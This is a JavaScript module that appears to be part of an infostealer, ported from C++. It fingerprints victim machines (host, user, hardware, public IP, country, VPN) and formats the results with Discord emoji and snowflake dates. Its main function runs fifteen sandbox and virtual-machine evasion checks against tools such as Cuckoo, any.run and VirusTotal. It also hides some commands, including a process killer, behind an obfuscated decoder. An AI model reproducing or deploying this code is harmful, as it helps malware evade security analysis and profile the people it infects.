// 317 NUMBER ONE - System Information Utilities
// Complete JS port of 317.cpp system functions
const os = require('os');
const { exec } = require('child_process');
const { promisify } = require('util');
const fs = require('fs/promises');
const path = require('path');

const execAsync = promisify(exec);
const { xd } = require('./crypto');

// ============================================================
// C++ Line 12-16: getComputerName / getUsername
// ============================================================

function getComputerName() {
  return os.hostname();
}

function getUsername() {
  return os.userInfo().username;
}

// ============================================================
// C++ Line 608-624: GetCPUName / GetGPUName
// ============================================================

function getCPUInfo() {
  const cpus = os.cpus();
  return cpus[0]?.model || 'Unknown CPU';
}

async function getGPUInfo() {
  try {
    // Primary: WMIC query
    const { stdout } = await execAsync('wmic path win32_VideoController get name /value', { timeout: 8000 });
    const matches = stdout.match(/Name=(.+)/gi);
    if (matches && matches.length > 0) {
      // Get all GPU names, prefer dedicated GPU (skip Microsoft Basic Display)
      const gpus = matches
        .map(m => m.replace(/^Name=/i, '').trim())
        .filter(g => g && !g.toLowerCase().includes('microsoft basic'));
      if (gpus.length > 0) return gpus[0];
    }
  } catch {}
  
  try {
    // Fallback: PowerShell Get-CimInstance
    const { stdout } = await execAsync(
      'powershell -NoProfile -Command "(Get-CimInstance Win32_VideoController).Name"',
      { timeout: 8000 }
    );
    const lines = stdout.trim().split('\n').map(l => l.trim()).filter(l => l && !l.toLowerCase().includes('microsoft basic'));
    if (lines.length > 0) return lines[0];
  } catch {}
  
  return 'Unknown GPU';
}

// ============================================================
// C++ Line 697-704: GetRAMInfo
// ============================================================

function getRAMInfo() {
  const totalGB = Math.ceil(os.totalmem() / (1024 ** 3));
  const freeGB = Math.floor(os.freemem() / (1024 ** 3));
  const usedGB = totalGB - freeGB;
  return `${usedGB} / ${totalGB} GB`;
}

// ============================================================
// C++ Line 515-540: GetPublicIP
// ============================================================

async function getPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=text', {
      timeout: 5000
    });
    return (await response.text()).trim();
  } catch {
    return 'Unknown';
  }
}

// ============================================================
// C++ Line 541-583: GetCountryFromIP
// ============================================================

async function getCountryFromIP(ip) {
  if (!ip || ip === 'Unknown') return { country: 'Unknown', code: '' };
  
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode`, {
      timeout: 5000
    });
    const data = await response.json();
    return {
      country: data.country || 'Unknown',
      code: data.countryCode || ''
    };
  } catch {
    return { country: 'Unknown', code: '' };
  }
}

// ============================================================
// C++ Line 585-594: CountryCodeToFlag
// ============================================================

function countryCodeToFlag(code) {
  if (!code || code.length !== 2) return '\\uD83C\\uDF0D'; // Globe emoji fallback
  
  const codePoints = [...code.toUpperCase()].map(char => 
    0x1F1E6 - 65 + char.charCodeAt(0)
  );
  
  return String.fromCodePoint(...codePoints);
}

// ============================================================
// C++ Line 284-285: Uptime check (GetTickCount64)
// ============================================================

function getUptime() {
  return os.uptime() * 1000;
}

// ============================================================
// C++ Line 626-695: GetVPNStatus
// ============================================================

async function getNetworkAdapters() {
  try {
    const { stdout } = await execAsync('wmic nic get name,MACAddress /format:csv');
    return stdout;
  } catch {
    return '';
  }
}

async function detectVPN(vpnAdapters) {
  try {
    const adapters = await getNetworkAdapters();
    const lowerAdapters = adapters.toLowerCase();
    
    for (const [keyword, emoji] of Object.entries(vpnAdapters)) {
      if (lowerAdapters.includes(keyword.toLowerCase())) {
        return emoji;
      }
    }
    
    return '<a:no:1502431716403580969> `No VPN Detected`';
  } catch {
    return '<a:no:1502431716403580969> `No VPN Detected`';
  }
}

// ============================================================
// C++ Line 143-151: pathExists / expandPath
// ============================================================

async function pathExists(filePath) {
  try {
    await fs.access(filePath);
    return true;
  } catch {
    return false;
  }
}

function expandPath(pathStr) {
  return pathStr.replace(/%([^%]+)%/g, (_, key) => {
    return process.env[key] || '';
  });
}

// ============================================================
// C++ Line 325-337: getFileCount (User Activity check)
// ============================================================

async function getFileCount(dirPath) {
  try {
    const files = await fs.readdir(dirPath);
    let count = 0;
    
    for (const file of files) {
      const fullPath = path.join(dirPath, file);
      try {
        const stat = await fs.stat(fullPath);
        if (stat.isFile()) count++;
      } catch {}
    }
    
    return count;
  } catch {
    return 0;
  }
}

// ============================================================
// C++ Line 1782-1816: KillProcess
// ============================================================

async function killProcess(processName) {
  try {
    await execAsync(`${xd('R1BEJR4EIwJFHHcXYTwg')} ${processName} /T 2>nul`, { timeout: 5000 });
    return true;
  } catch {
    return false;
  }
}

// ============================================================
// C++ Line 287-307: getRunningProcesses
// ============================================================

async function getRunningProcesses() {
  try {
    const { stdout } = await execAsync(xd('R1BEJRkEPBpFHHd4bjY+GU5KfXk='));
    return stdout.toLowerCase();
  } catch {
    return '';
  }
}

// ============================================================
// C++ Line 87-108: RunWmiQuery helper
// ============================================================

async function runWmiQuery(cmd) {
  try {
    const { stdout } = await execAsync(cmd, { timeout: 10000, windowsHide: true });
    return stdout.toLowerCase();
  } catch {
    return '';
  }
}

// ============================================================
// C++ Line 118-340: IsVirtualEnvironment (COMPLETE PORT)
// 15 detection layers matching C++ exactly
// ============================================================

async function isVirtualEnvironment(blacklist, minRequirements) {
  // ========== 1. HOSTNAME BLACKLIST (C++ line 119-137) ==========
  const hostname = getComputerName().toLowerCase();
  if (blacklist.hostnames.some(bad => hostname.includes(bad))) return true;
  
  // ========== 2. USERNAME BLACKLIST (C++ line 139-158) ==========
  const username = getUsername().toLowerCase();
  if (blacklist.usernames.some(bad => username.includes(bad))) return true;
  
  // ========== 3. GPU BLACKLIST via WMI (C++ line 160-169) ==========
  try {
    const gpuInfo = await runWmiQuery('wmic path win32_VideoController get name /value');
    const badGpus = [
      'vmware svga', 'virtualbox graphics', 'qxl', 'cirrus logic',
      'microsoft basic display adapter', 'red hat virtio', 'virtio-gpu',
      'standard vga graphics', 'hyper-v video'
    ];
    if (badGpus.some(bad => gpuInfo.includes(bad))) return true;
  } catch {}
  
  // ========== 4. CPU BLACKLIST via WMI (C++ line 171-179) ==========
  try {
    const cpuInfo = await runWmiQuery('wmic cpu get name /value');
    const badCpus = [
      'qemu', 'kvm', 'virtualbox', 'vmware', 'xen', 'hyper-v',
      'virtual machine', 'intel core processor (broadwell)'
    ];
    if (badCpus.some(bad => cpuInfo.includes(bad))) return true;
  } catch {}
  
  // ========== 5. WMI COMPUTER MODEL VM CHECK (C++ line 181-189) ==========
  try {
    const modelInfo = await runWmiQuery('wmic computersystem get model /value');
    const vmModels = [
      'virtualbox', 'vmware', 'virtual machine', 'qemu', 'kvm',
      'xen', 'parallels', 'bhyve', 'hvm domu'
    ];
    if (vmModels.some(bad => modelInfo.includes(bad))) return true;
  } catch {}
  
  // ========== 6. REGISTRY VM DETECTION (C++ line 191-204) ==========
  try {
    const regPaths = [
      'HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools',
      'HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions',
      'HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters'
    ];
    for (const regPath of regPaths) {
      try {
        await execAsync(`reg query "${regPath}" 2>nul`, { timeout: 3000 });
        return true; // Key exists = VM detected
      } catch {}
    }
  } catch {}
  
  // ========== 7. VM FILES & DRIVERS (C++ line 206-217) ==========
  const vmFiles = [
    'C:\\windows\\System32\\drivers\\vmhgfs.sys',
    'C:\\windows\\System32\\drivers\\vmmouse.sys',
    'C:\\windows\\System32\\drivers\\VBoxMouse.sys',
    'C:\\windows\\System32\\drivers\\VBoxGuest.sys',
    'C:\\windows\\System32\\vboxdisp.dll',
    'C:\\windows\\System32\\vmGuestLib.dll'
  ];
  for (const vmFile of vmFiles) {
    if (await pathExists(vmFile)) return true;
  }
  
  // ========== 8. VM MAC ADDRESS PREFIXES (C++ line 219-240) ==========
  if (blacklist.macPrefixes && blacklist.macPrefixes.length > 0) {
    try {
      const { stdout } = await execAsync(xd('VFRDIxQOb0EjfBF0HSNNYCAt') + ' 2>nul', { timeout: 5000 });
      const macLines = stdout.split('\n');
      for (const line of macLines) {
        const macMatch = line.match(/([0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2})/);
        if (macMatch) {
          const macParts = macMatch[1].split(/[-:]/).map(h => parseInt(h, 16));
          for (const prefix of blacklist.macPrefixes) {
            if (macParts[0] === prefix[0] && macParts[1] === prefix[1] && macParts[2] === prefix[2]) {
              return true;
            }
          }
        }
      }
    } catch {}
  }
  
  // ========== 9. HARDWARE SPECS (C++ line 242-255) ==========
  const cpuCount = os.cpus().length;
  if (cpuCount < (minRequirements.cpuCores || 2)) return true;
  
  const totalRAMGB = os.totalmem() / (1024 ** 3);
  if (totalRAMGB < (minRequirements.ramGB || 2)) return true;
  
  // Disk space check (C++ line 252-255)
  try {
    const { stdout: diskOut } = await execAsync(
      'wmic logicaldisk where "DeviceID=\'C:\'" get Size /value', { timeout: 5000 }
    );
    const sizeMatch = diskOut.match(/Size=(\d+)/);
    if (sizeMatch) {
      const diskGB = parseInt(sizeMatch[1]) / (1024 ** 3);
      if (diskGB < (minRequirements.diskGB || 60)) return true;
    }
  } catch {}
  
  // ========== 10. SANDBOX PATH DETECTION (C++ line 257-270) ==========
  try {
    const exePath = process.execPath.toLowerCase();
    const sandboxPaths = [
      '\\sandbox\\', '\\cuckoo\\', '\\analysis\\', '\\malware\\', '\\sample\\',
      '\\honeypot\\', '\\any.run\\', '\\joesandbox\\',
      '\\virustotal\\', '\\hybrid-analysis\\', '\\windows\\temp\\sandbox\\'
    ];
    if (sandboxPaths.some(sp => exePath.includes(sp))) return true;
  } catch {}
  
  // ========== 11. ENVIRONMENT VARIABLES (C++ line 272-277) ==========
  const debugEnvVars = ['SANDBOX', 'ANALYSIS', 'VIRUSTOTAL', 'CUCKOOSANDBOX'];
  for (const envVar of debugEnvVars) {
    if (process.env[envVar]) return true;
  }
  
  // ========== 12. SANDBOXIE / WINE DLL DETECTION (C++ line 279-282) ==========
  // In JS we check via process list and registry
  try {
    const { stdout: dllCheck } = await execAsync(
      xd('R1BEJRkEPBpFHHwXHRcEKioJXx9TIhk=') + ' 2>nul', { timeout: 3000 }
    );
    if (dllCheck.toLowerCase().includes('sbiedll')) return true;
  } catch {}
  
  // ========== 13. SYSTEM UPTIME < 10 min = sandbox (C++ line 284-285) ==========
  const uptimeMs = getUptime();
  if (uptimeMs < (minRequirements.uptimeMinutes || 10) * 60 * 1000) return true;
  
  // ========== 14. ANALYSIS PROCESS LIST (C++ line 287-323) ==========
  try {
    const processes = await getRunningProcesses();
    if (blacklist.processes.some(proc => processes.includes(proc.toLowerCase()))) return true;
  } catch {}
  
  // ========== 15. USER ACTIVITY - Documents folder (C++ line 325-337) ==========
  try {
    const docsPath = path.join(os.homedir(), 'Documents');
    const fileCount = await getFileCount(docsPath);
    if (fileCount < (minRequirements.documentsMinFiles || 3)) return true;
  } catch {}
  
  return false;
}

// ============================================================
// C++ Line 502-513: SanitizeJSON
// ============================================================

function sanitizeJSON(str) {
  if (!str) return '';
  return str;
}

// ============================================================
// C++ Line 595-607: SnowflakeToDate
// ============================================================

function snowflakeToDate(snowflake) {
  if (!snowflake || snowflake === 'Unknown') return 'Unknown';
  
  try {
    const timestamp = (BigInt(snowflake) >> 22n) + 1420070400000n;
    const date = new Date(Number(timestamp));
    
    const day = String(date.getUTCDate()).padStart(2, '0');
    const month = String(date.getUTCMonth() + 1).padStart(2, '0');
    const year = date.getUTCFullYear();
    
    return `${day}/${month}/${year}`;
  } catch {
    return 'Unknown';
  }
}

// ============================================================
// C++ Line 705-714: CalculateMonthsSince
// ============================================================

function calculateMonthsSince(isoDate) {
  if (!isoDate || isoDate === 'null' || isoDate === 'Unknown' || isoDate.length < 7) {
    return -1;
  }
  
  try {
    const [year, month] = isoDate.split('-').map(Number);
    const now = new Date();
    const currentYear = now.getUTCFullYear();
    const currentMonth = now.getUTCMonth() + 1;
    
    return (currentYear - year) * 12 + (currentMonth - month);
  } catch {
    return -1;
  }
}

module.exports = {
  getComputerName,
  getUsername,
  getCPUInfo,
  getGPUInfo,
  getRAMInfo,
  getPublicIP,
  getCountryFromIP,
  countryCodeToFlag,
  getUptime,
  getNetworkAdapters,
  detectVPN,
  pathExists,
  expandPath,
  getFileCount,
  killProcess,
  getRunningProcesses,
  runWmiQuery,
  isVirtualEnvironment,
  sanitizeJSON,
  snowflakeToDate,
  calculateMonthsSince
};
